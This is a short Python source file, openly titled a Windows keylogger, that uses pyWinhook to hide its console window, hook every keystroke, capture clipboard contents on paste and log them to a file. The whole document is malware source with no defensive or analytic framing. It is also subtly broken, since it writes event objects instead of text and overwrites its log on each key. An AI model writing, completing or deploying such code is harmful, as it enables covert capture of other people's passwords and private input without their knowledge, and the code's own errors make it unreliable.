# Python code for keylogger on Windows using pyWinhook

import pyWinhook
import pythoncom
import win32clipboard
import win32console
import win32gui

# Grab Windows console
win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)


# Create function to grab key and mouse strokes
def keyboardEvent(event):
    if 32 < event.Ascii < 127:
        print(chr(event.Ascii), end='')
        with open(f"output.txt", "w") as f:
            # write output to file
            f.write(event)
    else:
        if event.Key == 'V':
            win32clipboard.OpenClipboard()
            value = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print(f'[PASTE] - {value}')
            with open(f"output.txt", "w") as f:
                # write output to file
                f.write(event)
        else:
            print(f'{event.Key}')
            with open(f"output.txt", "w") as f:
                # write output to file
                f.write(event)
    return True


# create a hook manager object
hm = pyWinhook.HookManager()
hm.KeyDown = keyboardEvent
# set the hook
hm.HookKeyboard()
# wait forever
# while time.thread_time() < TIMEOUT:
pythoncom.PumpMessages()
